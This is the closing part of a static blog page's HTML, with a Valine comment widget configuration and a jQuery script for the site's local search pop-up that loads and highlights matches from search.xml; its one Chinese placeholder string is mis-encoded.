    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'bvYdGuNcba0iIaGV2jMAQyWV-9Nh9j0Va',
        appKey: 'xG35MDchd168iqtnj3iwQQia',
        placeholder: 'å¦‚ä½ æœ‰æ›´å¥½çš„å»ºè®®å’Œæƒ³æ³•ï¼Œè¯·ç•™ä¸‹å§',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
